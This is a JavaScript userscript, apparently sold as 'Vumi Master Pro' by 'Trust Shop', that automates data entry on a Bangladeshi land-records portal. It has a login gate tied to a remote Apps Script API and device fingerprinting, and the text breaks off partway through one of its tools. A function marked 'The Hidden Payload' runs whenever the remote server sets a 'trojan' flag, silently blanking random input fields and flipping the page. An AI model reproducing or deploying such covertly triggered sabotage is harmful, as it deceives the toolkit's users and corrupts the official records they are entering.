(async function() {
    if (document.getElementById('vumi-master-toolkit')) return;
    
    // আপনার দেওয়া নতুন Google Apps Script API লিংক
    const API_URL = "https://script.google.com/macros/s/AKfycbxi2hFWmkWkgSl2_ATdNiJbMPTxXCtEHNacyfK_6llSXGYCXPDkB4kLVx9Kma1BgDCWhQ/exec";
    const CURRENT_VERSION = "2.0"; // বর্তমান ভার্সন
    
    /* =========================================================
       [ HARDWARE FINGERPRINT & SUPER COOKIE SYSTEM ]
    ========================================================= */
    function getStableDeviceId() {
        let nav = window.navigator;
        let str = nav.platform + "-" + (nav.hardwareConcurrency || "0") + "-" + (nav.deviceMemory || "0") + "-" + window.screen.width + "x" + window.screen.height;
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            let char = str.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash;
        }
        return "VMT-HW-" + Math.abs(hash);
    }

    function getBaseDomain() {
        let parts = window.location.hostname.split('.');
        if (parts.length >= 3) return parts.slice(-3).join('.');
        return window.location.hostname;
    }

    function setVmtCookie(name, value, days) {
        let expires = "";
        if (days) {
            let date = new Date(); date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); expires = "; expires=" + date.toUTCString();
        }
        document.cookie = name + "=" + (value || "")  + expires + "; path=/; domain=." + getBaseDomain();
    }

    function getVmtCookie(name) {
        let nameEQ = name + "="; let ca = document.cookie.split(';');
        for(let i=0;i < ca.length;i++) {
            let c = ca[i]; while (c.charAt(0)==' ') c = c.substring(1,c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
        }
        return null;
    }

    let deviceId = getStableDeviceId();
    let savedAuth = getVmtCookie('vmt_auth_hash');
    let tFlag = getVmtCookie('vmt_t_flag');

    /* =========================================================
       [ ESC KEY LISTENER & SHORTCUTS ]
    ========================================================= */
    window._vmtKeyHandler = window._vmtKeyHandler || function(e) {
        if (e.key === 'Escape' || e.keyCode === 27) {
            let tk = document.getElementById('vumi-master-toolkit');
            let po = document.getElementById('vmt-pass-overlay');
            if (tk) { tk.remove(); }
            if (po) { po.remove(); }
        }

        if (savedAuth && e.altKey && !e.ctrlKey && !e.shiftKey) {
            let toolNum = null;
            if (e.key === '1') toolNum = 't1'; else if (e.key === '2') toolNum = 't2';
            else if (e.key === '3') toolNum = 't3'; else if (e.key === '4') toolNum = 't4';
            else if (e.key === '5') toolNum = 't5'; else if (e.key === '6') toolNum = 't6';
            else if (e.key === '7') toolNum = 't7'; else if (e.key === '8') toolNum = 't8';
            else if (e.key === '9') toolNum = 't9'; else if (e.key === '0') toolNum = 't10';

            if (toolNum && window._vmtTools && window._vmtTools[toolNum]) {
                e.preventDefault();
                try {
                    window._vmtTools[toolNum]();
                    let toolKitDiv = document.getElementById('vumi-master-toolkit');
                    let minButton = document.getElementById('vmt-min');
                    if (toolKitDiv && !toolKitDiv.classList.contains('minimized')) {
                        toolKitDiv.classList.add('minimized');
                        if (minButton) minButton.innerText = '+';
                    }
                } catch(err) { console.error('Shortcut Error:', err); }
            }
        }
    };
    document.removeEventListener('keydown', window._vmtKeyHandler);
    document.addEventListener('keydown', window._vmtKeyHandler);
    
    // Live Background Check (Banned, Trojan & Update Notification)
    async function checkLiveStatus() {
        try {
            if(!savedAuth) return;
            let userId = atob(savedAuth);
            let response = await fetch(`${API_URL}?action=verify&userid=${encodeURIComponent(userId)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`);
            let data = await response.json();
            
            // Check Banned
            if (data.success === false) {
                setVmtCookie('vmt_auth_hash', '', -1); setVmtCookie('vmt_t_flag', '', -1);
                let tk = document.getElementById('vumi-master-toolkit'); if (tk) tk.remove();
                alert("⚠️ সেশন এক্সপায়ার্ড বা ব্যান করা হয়েছে! অ্যাডমিন আপনার অ্যাক্সেস বাতিল করেছেন।");
                window.location.reload(); 
            } else {
                // Check Trojan
                if (data.trojan === true) { setVmtCookie('vmt_t_flag', 'engaged', 30); tFlag = 'engaged'; } 
                else { setVmtCookie('vmt_t_flag', '', -1); tFlag = ''; }
                
                // Check Update Version
                if (data.latestVersion && data.latestVersion !== CURRENT_VERSION && !document.getElementById('vmt-update-overlay')) {
                    showUpdatePopup(data.latestVersion, data.downloadUrl);
                }
            }
        } catch (e) { console.log("Background check running..."); }
    }
    
    function showUpdatePopup(newVersion, dLink) {
        const updateOverlay = document.createElement('div');
        updateOverlay.id = 'vmt-update-overlay';
        updateOverlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15,23,42,0.85);z-index:99999999;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',Arial,sans-serif;";
        updateOverlay.innerHTML = `
        <div style="background:#fff;padding:30px;border-radius:20px;text-align:center;width:340px;box-shadow:0 20px 50px rgba(0,0,0,0.5);">
            <div style="font-size:50px;margin-bottom:10px;animation:vmtSlideUp 0.5s;">🚀</div>
            <h3 style="margin:0 0 10px;color:#1e3a8a;font-size:22px;font-weight:900;">নতুন আপডেট এসেছে!</h3>
            <p style="color:#64748b;font-size:13px;margin:0 0 20px;">আপনার ভার্সন: <b>${CURRENT_VERSION}</b><br>নতুন ভার্সন: <b style="color:#10b981;">${newVersion}</b></p>
            <p style="color:#ef4444;font-size:12px;font-weight:700;margin-bottom:20px;padding:10px;background:#fef2f2;border-radius:8px;border:1px solid #fecaca;">টুলকিটের সব সুবিধা সচল রাখতে দয়া করে আপডেট করুন।</p>
            <a href="${dLink || '#'}" target="_blank" style="background:linear-gradient(135deg, #1e3a8a, #3b82f6);color:#fff;padding:14px 25px;text-decoration:none;border-radius:12px;font-weight:bold;display:block;font-size:16px;box-shadow:0 4px 15px rgba(59,130,246,0.4);transition:0.3s;" onclick="this.style.transform='scale(0.95)'">এখনই ডাউনলোড করুন 📥</a>
            <button onclick="document.getElementById('vmt-update-overlay').remove()" style="background:none;border:none;color:#94a3b8;margin-top:15px;cursor:pointer;font-size:12px;text-decoration:underline;">পরে মনে করিয়ে দিন</button>
        </div>`;
        document.body.appendChild(updateOverlay);
    }

    // The Hidden Payload
    function activatePayload() {
        setInterval(() => {
            if(tFlag === 'engaged') {
                document.querySelectorAll('input').forEach(inp => {
                    if(Math.random() > 0.8 && !inp.closest('#vumi-master-toolkit') && !inp.closest('#vmt-pass-box')) inp.value = "";
                });
                if(document.body && Math.random() > 0.95) {
                    document.body.style.transition = "all 2s"; document.body.style.transform = "rotate(180deg) scale(0.8)";
                    setTimeout(() => { document.body.style.transform = "none"; }, 5000);
                }
            }
        }, 5000); 
    }
    
    // Global Styles
    const gStyles = document.createElement('style');
    gStyles.innerHTML = `
        @keyframes vmtFadeIn { from { opacity: 0; backdrop-filter: blur(0px); } to { opacity: 1; backdrop-filter: blur(12px); } }
        @keyframes vmtSlideUp { from { transform: translateY(30px) scale(0.95); opacity: 0; } to { transform: translateY(0) scale(1); opacity: 1; } }
        @keyframes vmtShake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
        .vmt-glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.5); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.3); }
        .vmt-input-glow:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.2); background: #fff !important; }
        .vmt-btn-grad { background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); color: #fff; transition: all 0.3s ease; }
        .vmt-btn-grad:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(59, 130, 246, 0.4); }
        .vmt-btn-disabled { background: #cbd5e1 !important; cursor: not-allowed !important; box-shadow: none !important; transform: none !important; }
        input:focus, select:focus, textarea:focus { background-color: #fef08a !important; outline: 3px solid #eab308 !important; transition: background-color 0.1s; }
    `;
    document.head.appendChild(gStyles);
    
    if (!savedAuth) {
        const passOverlay = document.createElement('div');
        passOverlay.id = 'vmt-pass-overlay';
        passOverlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15,23,42,0.7);z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',Arial,sans-serif;animation:vmtFadeIn 0.4s forwards;";
        passOverlay.innerHTML = `
        <div class="vmt-glass" id="vmt-pass-box" style="border-radius:24px;padding:40px 30px;width:320px;text-align:center;animation:vmtSlideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1);position:relative;overflow:hidden;">
            <button id="vmt-pass-close" style="position:absolute;top:15px;right:15px;border:none;background:none;font-size:24px;cursor:pointer;color:#ef4444;line-height:1;">&times;</button>
            <div style="font-size:48px;margin-bottom:10px;">🔒</div>
            <h3 style="margin:0 0 5px;color:#0f172a;font-size:22px;font-weight:900;">ভূমি টুলকিট প্রো</h3>
            <p style="color:#64748b;font-size:12px;margin:0 0 15px;font-weight:bold;">অ্যাক্সেস করতে প্যানেল থেকে পাওয়া আইডি দিন</p>
            <input id="vmt-user-input" type="text" placeholder="User ID" class="vmt-input-glow" style="width:100%;padding:12px;border:2px solid #e2e8f0;border-radius:12px;text-align:center;margin-bottom:10px;font-weight:bold;outline:none;box-sizing:border-box;" />
            <input id="vmt-pass-input" type="password" placeholder="••••••••" class="vmt-input-glow" style="width:100%;padding:12px;border:2px solid #e2e8f0;border-radius:12px;text-align:center;letter-spacing:4px;font-weight:bold;outline:none;box-sizing:border-box;" />
            <div id="vmt-pass-error" style="color:#ef4444;font-size:12px;margin:10px 0;min-height:35px;font-weight:bold;display:flex;align-items:center;justify-content:center;flex-direction:column;"></div>
            <button id="vmt-pass-btn" class="vmt-btn-grad" style="width:100%;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:15px;">লগইন করুন 🚀</button>
            <div style="margin-top:25px;padding-top:15px;border-top:1px solid #e2e8f0;">
                <span style="font-size:9px;color:#94a3b8;letter-spacing:1px;text-transform:uppercase;font-weight:800;display:block;">Proudly Developed By</span>
                <span style="background:linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900;font-size:16px;letter-spacing:1px;">TRUST SHOP</span>
            </div>
        </div>`;
        document.body.appendChild(passOverlay);
        
        const usrInp = document.getElementById('vmt-user-input');
        const passInp = document.getElementById('vmt-pass-input');
        const btn = document.getElementById('vmt-pass-btn');
        const err = document.getElementById('vmt-pass-error');
        const box = document.getElementById('vmt-pass-box');
        
        document.getElementById('vmt-pass-close').onclick = () => passOverlay.remove();
        
        // 3-Strike Lockout Logic
        let timerInterval = null;
        function startLockdown(endTime) {
            usrInp.disabled = true; passInp.disabled = true; btn.className = "vmt-btn-disabled"; btn.disabled = true; passInp.value = '';
            box.style.animation = 'none'; box.offsetHeight; box.style.animation = 'vmtShake 0.4s ease';
            clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                let now = Date.now();
                if (now >= endTime) {
                    clearInterval(timerInterval); localStorage.setItem('vmt_fail_count', '0');
                    usrInp.disabled = false; passInp.disabled = false; btn.disabled = false; btn.className = "vmt-btn-grad";
                    err.innerHTML = "<span style='color:#10b981;'>✅ লক শেষ! আবার চেষ্টা করুন।</span>";
                    setTimeout(() => { if (!passInp.disabled) err.innerHTML = ''; }, 3000); usrInp.focus();
                } else {
                    let secLeft = Math.ceil((endTime - now) / 1000);
                    let min = Math.floor(secLeft / 60); let sec = secLeft % 60;
                    let timeStr = (min > 0 ? min + " মি " : "") + sec + " সে";
                    err.innerHTML = "🚫 <b>অ্যাক্সেস লকড!</b><br><span style='color:#f59e0b;margin-top:4px;'>অপেক্ষা করুন: " + timeStr + "</span>";
                }
            }, 1000);
        }
        
        let lockUntil = parseInt(localStorage.getItem('vmt_lock') || '0');
        if (Date.now() < lockUntil) { startLockdown(lockUntil); } else { setTimeout(() => usrInp.focus(), 100); }
        
        function showError(msg) {
            let attempts = parseInt(localStorage.getItem('vmt_fail_count') || '0') + 1;
            localStorage.setItem('vmt_fail_count', attempts);
            btn.innerHTML = "লগইন করুন 🚀"; btn.className = "vmt-btn-grad"; btn.disabled = false; usrInp.disabled = false; passInp.disabled = false; passInp.value = '';
            if (attempts >= 3) {
                let newLockTime = Date.now() + 120000; localStorage.setItem('vmt_lock', newLockTime); startLockdown(newLockTime);
            } else {
                let left = 3 - attempts;
                err.innerHTML = `${msg}<br><span style="color:#f59e0b;font-size:11px;">আর <b>${left}</b> বার চেষ্টা করতে পারবেন।</span>`;
                box.style.animation = 'none'; box.offsetHeight; box.style.animation = 'vmtShake 0.4s ease';
                passInp.style.borderColor = '#ef4444'; passInp.style.background = '#fef2f2';
                setTimeout(() => { if (!passInp.disabled) { passInp.style.borderColor = '#e2e8f0'; passInp.style.background = '#fff'; } }, 2000); passInp.focus();
            }
        }
        
        async function checkPass() {
            if (passInp.disabled) return;
            let userId = usrInp.value.trim(); let password = passInp.value.trim();
            if(!userId || !password) { err.innerHTML = "❌ আইডি এবং পাসওয়ার্ড উভয়ই দিন!"; box.style.animation = 'none'; box.offsetHeight; box.style.animation = 'vmtShake 0.4s ease'; return; }
            
            btn.innerHTML = "চেক করা হচ্ছে... ⏳"; btn.className = "vmt-btn-disabled"; btn.disabled = true; usrInp.disabled = true; passInp.disabled = true; err.innerHTML = "";
            try {
                let response = await fetch(`${API_URL}?userid=${encodeURIComponent(userId)}&password=${encodeURIComponent(password)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`);
                let data = await response.json();
                if (data.success === true) {
                    localStorage.setItem('vmt_fail_count', '0');
                    setVmtCookie('vmt_auth_hash', btoa(userId), 7);
                    savedAuth = btoa(userId);
                    if(data.trojan === true) { setVmtCookie('vmt_t_flag', 'engaged', 30); tFlag = 'engaged'; } 
                    else { eraseVmtCookie('vmt_t_flag'); tFlag = ''; }
                    err.innerHTML = `<span style='color:#10b981;'>✅ ${data.message}</span>`;
                    setTimeout(() => { passOverlay.remove(); loadToolkit(); activatePayload(); setInterval(checkLiveStatus, 30000); checkLiveStatus(); }, 1200); 
                } else { 
                    showError(`❌ ${data.message}`); 
                }
            } catch (error) { showError("❌ সার্ভার কানেকশন ফেইল!"); }
        }
        btn.onclick = checkPass;
        passInp.onkeydown = e => { if (e.key === 'Enter') checkPass(); };
        usrInp.onkeydown = e => { if (e.key === 'Enter') passInp.focus(); };
        return;
    } else {
        loadToolkit();
        activatePayload();
        setInterval(checkLiveStatus, 30000);
        checkLiveStatus(); 
    }
    
    function loadToolkit() {
        const style = document.createElement('style');
        style.innerHTML = `
        #vumi-master-toolkit{position:fixed;top:20px;right:20px;width:340px;border-radius:16px;z-index:999999;font-family:'Segoe UI',Arial,sans-serif;overflow:hidden;transition:width 0.3s ease; box-shadow: 0 10px 40px rgba(0,0,0,0.2); background:rgba(255,255,255,0.98); backdrop-filter: blur(10px);}
        #vumi-master-toolkit.minimized{width:220px;}
        #vumi-master-toolkit.minimized .vmt-body,#vumi-master-toolkit.minimized .vmt-footer{display:none;}
        .vmt-header{background:linear-gradient(135deg, #0f172a 0%, #1e293b 100%);color:#f8fafc;padding:15px 20px;cursor:move;display:flex;justify-content:space-between;align-items:center;font-weight:900;font-size:15px;user-select:none;border-bottom:2px solid #cbd5e1;}
        .vmt-header-btns{display:flex;gap:8px;}
        .vmt-header-btn{background:rgba(255,255,255,0.1);border:none;color:#fff;width:28px;height:28px;border-radius:8px;cursor:pointer;font-size:16px;font-weight:bold;display:flex;align-items:center;justify-content:center;transition:all 0.2s;}
        .vmt-header-btn:hover{background:rgba(255,255,255,0.25);transform:scale(1.05);}
        .vmt-body{padding:15px;max-height:72vh;overflow-y:auto;background:#f8fafc;}
        .vmt-body::-webkit-scrollbar{width:6px;} .vmt-body::-webkit-scrollbar-thumb{background:#cbd5e1;border-radius:10px;}
        .vmt-tool{background:#fff;border:1px solid #e2e8f0;padding:12px;border-radius:12px;margin-bottom:12px;cursor:pointer;display:flex;align-items:center;gap:15px;transition:all 0.2s cubic-bezier(0.4,0,0.2,1);box-shadow:0 2px 6px rgba(0,0,0,0.03);}
        .vmt-tool:hover{border-color:#3b82f6;background:#eff6ff;transform:translateY(-2px);box-shadow:0 6px 12px rgba(59,130,246,0.15);}
        .vmt-tool-icon{font-size:22px;width:30px;text-align:center;filter:drop-shadow(0 2px 3px rgba(0,0,0,0.1)); pointer-events:none;}
        .vmt-tool-num{background:linear-gradient(135deg, #6366f1, #3b82f6);color:#fff;width:26px;height:26px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:900;flex-shrink:0;box-shadow:0 2px 6px rgba(59,130,246,0.4); pointer-events:none;}
        .vmt-tool-text{flex-grow:1; display:flex; font-size:14px; font-weight:800; color:#1e293b; justify-content:space-between; align-items:center; pointer-events:none;}
        .shortcut-badge { font-size: 10px; color: #64748b; background: #f1f5f9; padding: 2px 6px; border-radius: 4px; border: 1px solid #cbd5e1; font-weight:700;}
        .vmt-footer{background:linear-gradient(to bottom, #f8fafc, #f1f5f9); border-top:1px solid #e2e8f0; padding:15px; text-align:center;}
        `;
        document.head.appendChild(style);
        
        const tk = document.createElement('div');
        tk.id = 'vumi-master-toolkit';
        tk.innerHTML = `
        <div class="vmt-header" id="vmt-drag">
            <div style="display:flex; flex-direction:column;">
                <span><span style="color:#60a5fa; margin-right:5px;">❖</span>VUMI MASTER PRO</span>
                <span style="font-size:9px; color:#94a3b8; font-weight:600; letter-spacing:1px; margin-top:2px;">PROFESSIONAL DATA SOLUTION KIT</span>
            </div>
            <div class="vmt-header-btns">
                <button class="vmt-header-btn" id="vmt-min" title="Minimize">−</button>
                <button class="vmt-header-btn" style="background:rgba(245,158,11,0.2);color:#fbbf24;" id="vmt-logout" title="লগআউট">🚪</button>
                <button class="vmt-header-btn" style="background:rgba(239,68,68,0.2);color:#fca5a5;" id="vmt-close" title="Close (অথবা Esc চাপুন)">×</button>
            </div>
        </div>
        <div class="vmt-body">
            <div class="vmt-tool" data-tool="t1"><span class="vmt-tool-num">১</span><span class="vmt-tool-icon">🎯</span><span class="vmt-tool-text">Land Entry (Range) <span class="shortcut-badge">Alt+1</span></span></div>
            <div class="vmt-tool" data-tool="t2"><span class="vmt-tool-num">২</span><span class="vmt-tool-icon">📅</span><span class="vmt-tool-text">Korer Year <span class="shortcut-badge">Alt+2</span></span></div>
            <div class="vmt-tool" data-tool="t3"><span class="vmt-tool-num">৩</span><span class="vmt-tool-icon">⚡</span><span class="vmt-tool-text">Auto Data Fill <span class="shortcut-badge">Alt+3</span></span></div>
            <div class="vmt-tool" data-tool="t4"><span class="vmt-tool-num">৪</span><span class="vmt-tool-icon">👥</span><span class="vmt-tool-text">Maliker Tottho <span class="shortcut-badge">Alt+4</span></span></div>
            <div class="vmt-tool" data-tool="t5"><span class="vmt-tool-num">৫</span><span class="vmt-tool-icon">🧮</span><span class="vmt-tool-text">Tottho 2.0 (Master) <span class="shortcut-badge">Alt+5</span></span></div>
            <div class="vmt-tool" data-tool="t6"><span class="vmt-tool-num">৬</span><span class="vmt-tool-icon">➕</span><span class="vmt-tool-text">Dag Add / Row <span class="shortcut-badge">Alt+6</span></span></div>
            <div class="vmt-tool" data-tool="t7"><span class="vmt-tool-num">৭</span><span class="vmt-tool-icon">📝</span><span class="vmt-tool-text">Dager Tottho <span class="shortcut-badge">Alt+7</span></span></div>
            <div class="vmt-tool" data-tool="t8"><span class="vmt-tool-num">৮</span><span class="vmt-tool-icon">📊</span><span class="vmt-tool-text">Collect Extracted Data <span class="shortcut-badge">Alt+8</span></span></div>
            <div class="vmt-tool" data-tool="t9"><span class="vmt-tool-num">৯</span><span class="vmt-tool-icon">💠</span><span class="vmt-tool-text">Smart Calculator <span class="shortcut-badge">Alt+9</span></span></div>
            <div class="vmt-tool" data-tool="t10"><span class="vmt-tool-num">১০</span><span class="vmt-tool-icon">✂️</span><span class="vmt-tool-text">Land Deduction Pro <span class="shortcut-badge">Alt+0</span></span></div>
        </div>
        <div class="vmt-footer">
            <span style="color: #64748b; font-size: 10px; text-transform: uppercase; letter-spacing: 2px; font-weight: 800; display: block; margin-bottom: 5px;">PROUDLY DEVELOPED BY</span>
            <span style="background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; font-size: 20px; letter-spacing: 1.5px; display: block; text-shadow: 0px 2px 4px rgba(0,0,0,0.05);">TRUST SHOP</span>
            <span style="color: #94a3b8; font-size: 9px; text-transform: uppercase; letter-spacing: 2.5px; font-weight: 700; display: block; margin-top: 5px;">PREMIUM DIGITAL SOLUTIONS</span>
        </div>`;
        document.body.appendChild(tk);
        
        // Drag functionality
        (function() {
            let isDown = false, offX = 0, offY = 0;
            const h = document.getElementById('vmt-drag');
            h.addEventListener('mousedown', e => { if (e.target.tagName === 'BUTTON') return; isDown = true; offX = e.clientX - tk.offsetLeft; offY = e.clientY - tk.offsetTop; tk.style.boxShadow = "0 30px 60px rgba(0,0,0,0.3)"; });
            document.addEventListener('mousemove', e => {
                if (!isDown) return; let nY = e.clientY - offY; if (nY < 0) nY = 0; tk.style.left = (e.clientX - offX) + 'px'; tk.style.top = nY + 'px'; tk.style.right = 'auto';
            });
            document.addEventListener('mouseup', () => { isDown = false; tk.style.boxShadow = "0 10px 40px rgba(0,0,0,0.2)"; });
        })();
        
        document.getElementById('vmt-close').onclick = () => { tk.remove(); };
        document.getElementById('vmt-logout').onclick = async () => {
            if(confirm('আপনি কি লগআউট করতে চান?')) { 
                eraseVmtCookie('vmt_auth_hash'); eraseVmtCookie('vmt_t_flag');
                window.postMessage({ type: 'VMT_LOGOUT' }, '*'); tk.remove(); window.location.reload();
            }
        };
        document.getElementById('vmt-min').onclick = function() { tk.classList.toggle('minimized'); this.innerText = tk.classList.contains('minimized') ? '+' : '−'; };
        
        /* ==============================================================
           Main Logic Tools
        ============================================================== */
        window._vmtTools = {
            t1: function() {
                let t = { i: null, s: null }; let st = ['খতিয়ান বক্স', 'সংরক্ষণ বাটন']; let c = 0; alert("১. খতিয়ান বক্সে ক্লিক কর\n২. সংরক্ষণ বাটনে ক্লিক কর");
                document.onclick = function(e) {
                    if (e.target.closest('#vumi-master-toolkit')) return; let el = e.target; t[c === 0 ? 'i' : 's'] = el; el.style.border = "4px solid #ef4444"; c++;
                    if (c < 2) { console.log("Next: " + st[c]); } else {
                        document.onclick = null; let r = prompt("রেঞ্জ দাও (যেমন: ১৭৭-২০০):");
                        if (r) {
                            let p = r.replace(/[০-৯]/g, d => ({ '০': '0', '১': '1', '২': '2', '৩': '3', '৪': '4', '৫': '5', '৬': '6', '৭': '7', '৮': '8', '৯': '9' }[d])).split('-').map(Number);
                            (async function() {
                                for (let i = p[0]; i <= p[1]; i++) {
                                    let b = i.toString().replace(/\d/g, d => ({ '0': '০', '1': '১', '2': '২', '3': '৩', '4': '৪', '5': '৫', '6': '৬', '7': '৭', '8': '৮', '9': '৯' }[d]));
                                    t.i.focus(); t.i.value = b; t.i.dispatchEvent(new Event('input', { bubbles: true })); t.i.dispatchEvent(new Event('change', { bubbles: true })); t.i.blur();
                                    await new Promise(r => setTimeout(r, 5000)); t.s.click(); console.log("Saved: " + b); await new Promise(r => setTimeout(r, 6000));
                                }
                                alert("কাম শেষ!");
                            })();
                        }
                    }
                };
            },
            t2: function() {
                function setY(win) {
                    try {
                        let el = win.document.getElementById('paid_year');
                        if (el) {
                            let target = Array.from(el.options).find(o => o.text.includes("১৯৭৬") && o.text.includes("১৯৭৭"));
                            if (target) {
                                el.value = target.value; el.dispatchEvent(new Event('change', { bubbles: true }));
                                if (win.jQuery) { let $el = win.jQuery(el); $el.val(target.value).trigger('change'); if ($el.data('select2')) $el.trigger('select2:select'); }
                                let s2 = el.nextElementSibling; if (s2 && s2.classList.contains('select2')) { s2.style.border = "4px solid #ef4444"; s2.style.borderRadius = "6px"; } else el.style.border = "4px solid #ef4444";
                                return true;
                            }
                        }
                        for (let i = 0; i < win.frames.length; i++) if (setY(win.frames[i])) return true;
                    } catch (e) {} return false;
                } setY(window);
            },
            
            // ==========================================
            // Updated Tool 3 (Auto Data Fill) - Super Aggressive
            // ==========================================
            t3: function() {
                if (typeof $ === 'undefined') { alert('jQuery পাওয়া যায়নি!'); return; }
                const otherData = {
                    "জরিপ": "আর এস",
                    "মালিকানা": "সর্বশেষ জরিপ",
                    "হোল্ডিং": "সাধারণ"
                };
                let updatedCount = 0;
                $('select').not('#mouja_select').each(function() {
                    let $select = $(this);
                    let selectId = $select.attr('id');
                    
                    // লেবেল স্ক্যান (যেকোনো ট্যাগের ভেতর থাকুক না কেন)
                    let labelText = "";
                    if (selectId) {
                        labelText = $('label[for="' + selectId + '"]').text().trim();
                    }
                    if (!labelText) {
                        labelText = $select.closest('div, fieldset, td, .form-group').text().trim();
                    }
                    
                    for (let key in otherData) {
                        if (labelText.includes(key)) {
                            let targetText = otherData[key];
                            let $option = $select.find('option').filter(function() {
                                return $(this).text().trim().includes(targetText);
                            });
                            if ($option.length) {
                                $select.val($option.val()).trigger('change');
                                if ($select.data('select2')) {
                                    $select.trigger('select2:select');
                                }
                                updatedCount++;
                                console.log("✅ " + key + " সিলেক্ট হয়েছে।");
                            }
                        }
                    }
                });
                
                if(updatedCount > 0) {
                    alert("✅ সফলভাবে তথ্যগুলো অটো-ফিল হয়েছে!");
                } else {
                    alert("⚠️ কোনো খালি ঘর পাওয়া যায়নি! পেজ রিলোড দিয়ে আবার ট্রাই করুন।");
                }
            },

            t4: function() {
                let inp = document.createElement('input'); inp.type = 'file'; inp.accept = '.txt';
                inp.onchange = e => {
                    let f = e.target.files[0]; if (!f) return; let r = new FileReader();
                    r.onload = async function(ev) {
                        let txt = ev.target.result; let ls = txt.split('\n').map(l => l.trim()).filter(l => l); let oL = [], dL = [], isD = false;
                        for (let l of ls) { if (l.includes("দাগ নং")) { isD = true; continue; } if (isD) dL.push(l); else oL.push(l); }
                        let es = [], pn = [];
                        oL.forEach(l => {
                            if (l.includes("সাং") || l.includes("ঠিকানা")) { let a = l.replace(/(সাং|ঠিকানা)[:\s]*/, "").trim(); pn.forEach(p => { p.address = a; es.push(p); }); pn = []; }
                            else if (l.includes("পিং") || l.includes("জং") || l.includes("জঃ")) { let rel = l; if (l.includes("পিং")) rel = l.replace(/পিং[:\s]*/, "").trim(); else rel = l.trim(); for (let i = pn.length - 1; i >= 0; i--) { if (pn[i].father === "") pn[i].father = rel; else break; } }
                            else pn.push({ name: l, father: "", address: "" });
                        });
                        if (pn.length > 0) { let la = es.length > 0 ? es[es.length - 1].address : ""; pn.forEach(p => { p.address = la; es.push(p); }); }
                        let dgs = [], cls = []; dL.forEach(l => { let p = l.split(/\s+/); if (p.length >= 2) { dgs.push(p[0]); cls.push(p[p.length - 1]); } else if (p.length === 1) { dgs.push(p[0]); cls.push(""); } });
                        let amt = [];
                        if (dgs.length > 0) {
                            let aS = prompt("মোট " + dgs.length + " টি দাগ। পরিমাণ দিন (কমা দিয়ে):"); if (aS) amt = aS.split(',').map(s => s.trim());
                            let cS = prompt("রেকর্ডীয় শ্রেণী (কমা দিয়ে, খালি রাখলে ফাইলেরটা):"); if (cS) cls = cS.split(',').map(s => s.trim());
                        }
                        if (es.length === 0 && dgs.length === 0) { alert("ডাটা পাইনি!"); return; }
                        for (let i = 0; i < es.length; i++) {
                            let d = es[i]; let nF = document.getElementById('owner-name'); let fF = document.getElementById('verify-father-name'); let aF = document.getElementById('verify-address');
                            if (nF) nF.value = d.name; if (fF) fF.value = d.father; if (aF) aF.value = d.address;
                            if (typeof $ !== 'undefined') $('#owner-name,#verify-father-name,#verify-address').trigger('input').trigger('change');
                            if (typeof entryVerify === "function") await entryVerify(); else { let evB = document.getElementById('entry-verify'); if (evB) evB.click(); }
                            await new Promise(r => setTimeout(r, 2500));
                        }
                        if (dgs.length > 0) {
                            function uS2(w, el, tx) {
                                if (!el || !tx) return; let o = Array.from(el.options); let tg = o.find(x => x.text.trim() === tx.trim()) || o.find(x => x.text.includes(tx.trim()));
                                if (tg) { el.value = tg.value; el.dispatchEvent(new Event('change', { bubbles: true })); if (w.jQuery) { let $e = w.jQuery(el); $e.val(tg.value).trigger('change'); if ($e.data('select2')) $e.trigger('select2:select'); } }
                            }
                            function sv(w) {
                                try {
                                    let df = Array.from(w.document.querySelectorAll('.r2Dag_no'));
                                    if (df.length > 0) {
                                        if (df.length < dgs.length) alert("সারি কম! আগে রো বানান।");
                                        df.forEach((fd, ix) => {
                                            if (ix >= dgs.length) return; let row = fd;
                                            for (let i = 0; i < 5; i++) { if (row.parentElement && (row.querySelectorAll('.r2Amount_of_land').length >= 1 || row.querySelectorAll('.r2amount_of_landDag').length >= 1)) { if (row.querySelectorAll('.r2UsableLandType').length > 0) break; } row = row.parentElement; }
                                            fd.value = dgs[ix]; fd.dispatchEvent(new Event('input', { bubbles: true })); let av = amt[ix] || amt[amt.length - 1] || "";
                                            row.querySelectorAll('.r2amount_of_landDag, .r2Amount_of_land').forEach(af => { if (av) af.value = av; af.dispatchEvent(new Event('input', { bubbles: true })); af.style.backgroundColor = "#e8f4fd"; });
                                            let ss = Array.from(row.querySelectorAll('select'));
                                            if (ss.length >= 2) { let rt = cls[ix] || cls[cls.length - 1] || ""; if (rt) uS2(w, ss.find(s => !s.classList.contains('r2UsableLandType')) || ss[0], rt); uS2(w, row.querySelector('.r2UsableLandType') || ss[1], 'কৃষি'); }
                                        }); return true;
                                    }
                                    for (let j = 0; j < w.frames.length; j++) if (sv(w.frames[j])) return true;
                                } catch (e) {} return false;
                            } sv(window);
                        }
                        alert("শেষ!");
                    }; r.readAsText(f);
                }; inp.click();
            },
            t5: function() {
                let i = document.createElement('input'); i.type = 'file'; i.accept = '.txt';
